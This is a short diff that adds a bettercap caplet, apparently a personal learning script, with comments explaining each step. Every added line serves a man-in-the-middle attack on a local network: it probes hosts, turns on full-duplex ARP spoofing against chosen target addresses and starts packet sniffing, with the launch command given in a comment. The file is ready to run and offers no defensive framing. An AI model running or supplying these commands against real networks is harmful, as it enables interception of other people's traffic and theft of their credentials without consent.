@@ -1,4 +1,13 @@
-working
-working2
-working3
-working5
+#Start bettercap at eth0 interface (ifconfig can help, also pwd and ls)
+#>bettercap -iface eth0  -caplet buttercup.cap
+#net.probe send UDP packets to gather into the network
+net.probe on
+#show information of the network
+net.show
+#If you want spoof the host and router, It would be a fullduplex
+set arp.spoof.fullduplex true
+#x.x.x.x is IP target, It may be more than one, separated by a coma ","
+set arp.spoof.targets x.x.x.x
+arp.spoof on
+net.sniff on
+
